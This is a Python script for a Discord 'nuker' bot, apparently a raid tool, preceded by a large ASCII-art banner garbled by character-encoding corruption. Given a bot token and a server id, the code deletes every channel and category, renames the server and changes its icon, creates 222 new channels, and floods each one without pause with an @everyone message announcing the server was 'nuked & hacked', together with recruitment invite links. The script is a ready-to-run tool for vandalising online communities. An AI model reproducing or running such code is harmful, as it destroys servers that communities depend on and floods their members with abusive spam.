import discord
from discord.ext import commands
from colorama import init, Fore
import asyncio
import time

print(Fore.LIGHTBLUE_EX + "https://dsc.gg/hoddiearmy ")
print(Fore.LIGHTRED_EX + '''

                 
                  
                   
                    
                                                        
Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“â‚¬Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝                Ă˘â€“ďż˝Ă˘â€“ďż˝                            
  Ă˘â€“ďż˝Ă˘â€“ďż˝    Ă˘â€“â‚¬Ă˘â€“ďż˝                Ă˘â€“ďż˝Ă˘â€“ďż˝                            
  Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“ďż˝   Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž  Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬   Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬
  Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬  Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â‚¬Ă˘â€“â‚¬ Ă˘â€“ďż˝Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬  Ă˘â€“ďż˝Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â€žĂ˘â€“ďż˝  
  Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“ďż˝  Ă˘â€“â€žĂ˘â€“ďż˝      Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“ďż˝Ă˘â€“ďż˝        Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“â€žĂ˘â€“ďż˝   
  Ă˘â€“ďż˝Ă˘â€“ďż˝     Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž    Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“â€ž   Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“ďż˝Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž    Ă˘â€“â€ž   Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝    
Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬ Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬ Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬    Ă˘â€“â€žĂ˘â€“ďż˝     
                                               Ă˘â€“â€žĂ˘â€“ďż˝       
                                             Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬        

                                                                     
Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž   Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬   Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬ Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“â‚¬Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“â‚¬Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž  
  Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž    Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝       Ă˘â€“ďż˝   Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“â‚¬    Ă˘â€“ďż˝Ă˘â€“ďż˝    Ă˘â€“â‚¬Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž 
  Ă˘â€“ďż˝ Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝       Ă˘â€“ďż˝   Ă˘â€“ďż˝Ă˘â€“ďż˝ Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“â‚¬      Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“ďż˝    Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝  
  Ă˘â€“ďż˝  Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝       Ă˘â€“ďż˝   Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž      Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝    Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝   
  Ă˘â€“ďż˝   Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€žĂ˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝       Ă˘â€“ďż˝   Ă˘â€“ďż˝Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝     Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“ďż˝  Ă˘â€“â€ž Ă˘â€“ďż˝Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž   
  Ă˘â€“ďż˝     Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝  Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž     Ă˘â€“â€žĂ˘â€“ďż˝   Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž   Ă˘â€“ďż˝Ă˘â€“ďż˝     Ă˘â€“â€žĂ˘â€“ďż˝ Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž 
Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž    Ă˘â€“ďż˝Ă˘â€“ďż˝   Ă˘â€“â‚¬Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â‚¬Ă˘â€“â‚¬ Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž   Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž Ă˘â€“â€žĂ˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“ďż˝Ă˘â€“â€ž
                                                          
                                                          
                                                                                                                                
                                                                                                                                           
   
                                                                          
                        
                         
                          
                                                      
                               ''')

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
token = input(Fore.MAGENTA + "discord bot token: ")
guild_id = input("server id: ")
spam_message = input("spam message: ")
new_channels_name = input("new channels name: ")
new_guild_name = input("new server name: ") # PĹ™idĂˇno pro zmÄ›nu nĂˇzvu serveru
img = input("new server pfp URL: ") # PĹ™idĂˇno pro zmÄ›nu profilovky serveru
async def send_message_periodically(channel):
    while True:
        await channel.send("@everyone Nuked & hacked by *** + GRABBED TY FOR INFO BÄ‚Â­tch by HoodieArmy https://discord.gg/MQmbWVgJy7 (join)" + spam_message)
        await asyncio.sleep(0)
        print(Fore.GREEN + "spammed:", channel.name)

@bot.event
async def on_ready():
    print(f"Syntheeee  {bot.user}")

    
    guild = bot.get_guild(int(guild_id))

    if guild is None:
        print("server id error")
        return
    
    if guild:
        ignore_channel_name = "Crips"

        
        categories = [category for category in guild.categories if category.name != ignore_channel_name]
        text_channels = [channel for channel in guild.text_channels if channel.name != ignore_channel_name]
        voice_channels = [channel for channel in guild.voice_channels if channel.name != ignore_channel_name]

    for channel in text_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for channel in voice_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for category in categories:
        try:
            await category.delete()
            await asyncio.sleep(0)
            print("deleted", category.name)
        except:
            pass
    try:
        
        await guild.edit(name=new_guild_name)
        await print("")
    except:
        print("name edit error")
    try:
        with open(img, 'rb') as f:
            icon = f.read()
        await guild.edit(icon=icon)
        print("Server PFP has been changed succesfully")
    except discord.Forbidden:
        print("Bot has no rights to change server PFP")
    except FileNotFoundError:
        print("Image file not found")
    channels = []
    for i in range(222):
        channel_name = new_channels_name
        channel = await guild.create_text_channel(channel_name)
        channels.append(channel)
        await asyncio.sleep(0)
        print("created:", channel.name)
        
        bot.loop.create_task(send_message_periodically(channel))

bot.run(token)
